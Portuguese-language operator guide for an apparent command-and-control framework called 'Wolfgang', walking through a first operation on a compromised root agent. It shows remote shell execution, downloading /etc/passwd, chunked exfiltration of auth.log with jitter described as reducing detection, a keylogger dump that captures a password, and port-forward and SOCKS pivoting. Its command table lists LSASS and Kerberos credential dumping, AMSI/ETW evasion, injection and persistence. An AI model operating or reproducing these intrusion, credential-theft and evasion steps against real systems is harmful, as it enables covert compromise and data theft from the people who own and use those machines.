    Primeira Operacao¶

    Com o agent registrado e ativo, voce esta pronto para executar operacoes. Este guia cobre os comandos essenciais: execucao de modulos, visualizacao de resultados, operacoes com arquivos e exfiltracao. Certifique-se de que completou o Primeiro Implant antes de prosseguir.

    1. Selecionar o Agent¶

    No REPL do client, use o comando use com o ID do agent (ou um prefixo unico):

    wolfgang >> agents
ID        HOSTNAME     OS     USER    LAST SEEN            TRANSPORT  STATUS
a1b2c3d4  target-vm    linux  root    2026-03-14 10:15:00  https      active

wolfgang >> use a1b2
wolfgang [a1b2c3d4] >>

    O prompt muda para indicar que voce esta no contexto do agent. Todos os comandos subsequentes sao direcionados a este agent. Use back para retornar ao contexto root.

    Resolucao de ID

    Voce nao precisa digitar o ID completo. O client resolve prefixos unicos automaticamente. Se o prefixo for ambiguo (match em multiplos agents), ele avisa.

    Comandos disponiveis no contexto do agent¶

    O contexto do agent disponibiliza um conjunto completo de operacoes:

    Categoria Comandos
    Navegacao back, info, tasks, help
    Execucao shell, exec <cmd>, run <module> [args]
    Arquivos upload <local> <remote>, download <remote> <local>
    Exfiltracao exfil <path>, exfils, exfils download <id> <path>
    Reconnaissance sysinfo, osversion, screenshot, keylog
    Credentials creds lsass, creds kerberoast, creds hive, creds vault
    Lateral Movement rexec, pivot, portfwd, socks
    Evasion evasion amsi, evasion etw, evasion unhook, evasion inject
    Persistence persist <method> <path>, cleanup, selfdestruct

    2. Executar Modulos¶

    Comando unico: exec¶

    Execute um comando no alvo e aguarde o resultado:

    wolfgang [a1b2c3d4] >> exec whoami
[*] Task queued: b2c3d4e5 (module=shell.exec)
[+] Task completed:
root

    wolfgang [a1b2c3d4] >> exec cat /etc/hostname
[*] Task queued: c3d4e5f6 (module=shell.exec)
[+] Task completed:
target-vm

    Shell interativo: shell¶

    Para multiplos comandos em sequencia, abra uma sessao shell interativa:

    wolfgang [a1b2c3d4] >> shell
[*] Interactive shell on agent a1b2c3d4 (type 'exit' to return)
shell> id
[*] Task queued: d4e5f6a7 (module=shell.exec)
[+] Task completed:
uid=0(root) gid=0(root) groups=0(root)

shell> uname -a
[*] Task queued: e5f6a7b8 (module=shell.exec)
[+] Task completed:
Linux target-vm 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux

shell> exit
[*] Shell session closed.

    Cada comando no shell e enviado como uma task separada. O client aguarda o resultado antes de mostrar o proximo prompt.

    Reconnaissance: sysinfo¶

    Coleta informacoes completas do sistema:

    wolfgang [a1b2c3d4] >> sysinfo
[*] Task queued: f6a7b8c9 (module=recon.sysinfo)
[+] Task completed:
{
  "hostname": "target-vm",
  "os": "linux",
  "arch": "amd64",
  "kernel": "5.15.0-91-generic",
  "username": "root",
  "pid": 1234,
  "internal_ips": ["192.168.1.100"],
  "external_ip": "203.0.113.50"
}

    Modulo generico: run¶

    O comando run permite executar qualquer modulo registrado pelo nome:

    wolfgang [a1b2c3d4] >> run recon.sysinfo {}
[*] Running module recon.sysinfo...
[*] Task queued: a7b8c9d0 (module=recon.sysinfo)
[+] Task completed:
...

wolfgang [a1b2c3d4] >> run recon.osversion {}
[*] Running module recon.osversion...
[*] Task queued: b8c9d0e1 (module=recon.osversion)
[+] Task completed:
...

    Isso e util para modulos sem comando dedicado ou para modulos dinamicos carregados em runtime.

    3. Ciclo de Vida de uma Task¶

    Cada operacao no Wolfgang segue um ciclo de vida bem definido. Entender esse fluxo e essencial para diagnosticar problemas:

    sequenceDiagram
    participant OP as Operador
    participant SRV as Teamserver
    participant AGT as Agent

    OP->>SRV: POST /agents/{id}/tasks
    (module + args)
    Note over SRV: Task criada com status "pending"
    SRV->>OP: task_id

    Note over AGT: Proximo check-in (sleep + jitter)
    AGT->>SRV: GET /checkin
    (agent_id, envelope criptografado)
    Note over SRV: Task status -> "running"
    SRV->>AGT: Task(s) pendentes no payload

    Note over AGT: Modulo executa no alvo
    AGT->>SRV: POST /checkin
    (task_result, envelope criptografado)
    Note over SRV: Task status -> "completed"

    Note over OP: Polling ou WebSocket event
    OP->>SRV: GET /tasks/{task_id}
    SRV->>OP: Resultado da task

    Estados de uma task¶

    Status Descricao
    pending Task criada, aguardando proximo check-in do agent
    running Task despachada ao agent no check-in
    completed Resultado recebido com sucesso
    failed Execucao do modulo retornou erro
    expired TTL excedido (1 hora) sem que o agent fizesse check-in
    cancelled Cancelada pelo operador via cancel

    Timing e latencia¶

    O tempo entre enviar uma task e receber o resultado depende do intervalo de check-in do agent:

    • Sleep 5000ms + Jitter 10%: resultado em ~5-5.5 segundos
    • Sleep 60s + Jitter 10%: resultado em ate ~66 segundos
    • O client faz polling a cada 2 segundos ate timeout de 5 minutos

    Se o WebSocket estiver conectado, voce recebe notificacoes push de eventos (novo agent, task completada, etc.) sem depender de polling.

    Listar tasks do agent¶

    wolfgang [a1b2c3d4] >> tasks
ID        MODULE       STATUS     CREATED
b2c3d4e5  shell.exec   completed  2026-03-14 10:16:00
c3d4e5f6  shell.exec   completed  2026-03-14 10:16:05
d4e5f6a7  shell.exec   completed  2026-03-14 10:17:00
f6a7b8c9  recon.sysinfo completed 2026-03-14 10:18:00

    4. Operacoes com Arquivos¶

    Upload: operador -> alvo¶

    wolfgang [a1b2c3d4] >> upload /tmp/tool.sh /tmp/tool.sh
[*] Uploading /tmp/tool.sh (4096 bytes) -> /tmp/tool.sh
[*] Task queued: c9d0e1f2 (module=fileops.upload)
[+] Task completed:
File written to /tmp/tool.sh

    O conteudo do arquivo e codificado em base64 e enviado como argumento da task fileops.upload.

    Download: alvo -> operador¶

    wolfgang [a1b2c3d4] >> download /etc/passwd ./passwd_copy
[*] Downloading /etc/passwd -> ./passwd_copy
[*] Task queued: d0e1f2a3 (module=fileops.download)
[+] Saved 2048 bytes -> ./passwd_copy

    O arquivo e recebido em base64 na resposta da task e decodificado localmente pelo client.

    5. Exfiltracao de Dados¶

    Para arquivos maiores ou operacoes que precisam de resiliencia, use a exfiltracao chunked:

    Iniciar exfiltracao¶

    wolfgang [a1b2c3d4] >> exfil /var/log/auth.log
[*] Starting exfiltration of /var/log/auth.log...
[*] Task queued: e1f2a3b4 (module=exfil)
[+] Task completed:
Exfiltration started: session f2a3b4c5

    A exfiltracao chunked divide o arquivo em pedacos, envia cada chunk separadamente (com jitter entre envios), e reassembla no servidor. Isso permite:

    • Transferencia de arquivos grandes sem timeout
    • Resiliencia a interrupcoes de conexao
    • Jitter entre chunks para reduzir deteccao

    Monitorar sessoes de exfiltracao¶

    wolfgang [a1b2c3d4] >> exfils
ID        FILE           SIZE      PROGRESS  STATUS       CREATED
f2a3b4c5  auth.log       1048576   15/20     in_progress  2026-03-14 10:20:00

    Download do arquivo exfiltrado¶

    Apos a conclusao (status completed), baixe o arquivo reassemblado:

    wolfgang [a1b2c3d4] >> exfils download f2a3b4c5 ./auth.log
[+] Exfil data saved: ./auth.log (1048576 bytes)

    Parametros opcionais da exfiltracao¶

    exfil <remote_path> [chunk_size_bytes] [jitter_ms]
    Parametro Default Descricao
    remote_path (obrigatorio) Caminho do arquivo no alvo
    chunk_size_bytes auto Tamanho de cada chunk em bytes
    jitter_ms auto Delay aleatorio entre chunks em milissegundos

    6. Outras Operacoes Uteis¶

    Screenshot¶

    wolfgang [a1b2c3d4] >> screenshot
[*] Capturing screenshot...
[*] Task queued: a3b4c5d6 (module=recon.screenshot)
[+] Screenshot saved -> screenshot-a3b4c5d6.png (245760 bytes)

    Port forwarding¶

    wolfgang [a1b2c3d4] >> portfwd add 8080 192.168.1.200:80
[*] Task queued: b4c5d6e7 (module=lateral.portfwd)
[+] Task completed:
Port forward active: localhost:8080 -> 192.168.1.200:80

    SOCKS proxy¶

    wolfgang [a1b2c3d4] >> socks start 1080
[*] Task queued: c5d6e7f8 (module=lateral.socks)
[+] Task completed:
SOCKS5 proxy listening on :1080

    Keylogger¶

    wolfgang [a1b2c3d4] >> keylog start
[*] Task queued: d6e7f8a9 (module=recon.keylogger)
[+] Task completed:
Keylogger started.

wolfgang [a1b2c3d4] >> keylog dump
[*] Task queued: e7f8a9b0 (module=recon.keylogger)
[+] Task completed:
[10:25:01] admin: password123
[10:25:15] admin: ls -la /root

wolfgang [a1b2c3d4] >> keylog stop
[*] Task queued: f8a9b0c1 (module=recon.keylogger)
[+] Task completed:
Keylogger stopped.

    Resumo do Fluxo¶

    graph TD
    USE["use <agent_id>"] --> CTX["Contexto do Agent"]
    CTX --> EXEC["exec / shell / run"]
    CTX --> RECON["sysinfo / screenshot / keylog"]
    CTX --> FILES["upload / download"]
    CTX --> EXFIL["exfil / exfils"]
    CTX --> ADV["portfwd / socks / pivot"]

    EXEC --> TASK["Task criada (pending)"]
    RECON --> TASK
    FILES --> TASK
    EXFIL --> TASK
    ADV --> TASK

    TASK --> CHECKIN["Agent faz check-in"]
    CHECKIN --> RUN["Modulo executa"]
    RUN --> RESULT["Resultado retorna"]
    RESULT --> VIEW["Operador ve resultado"]
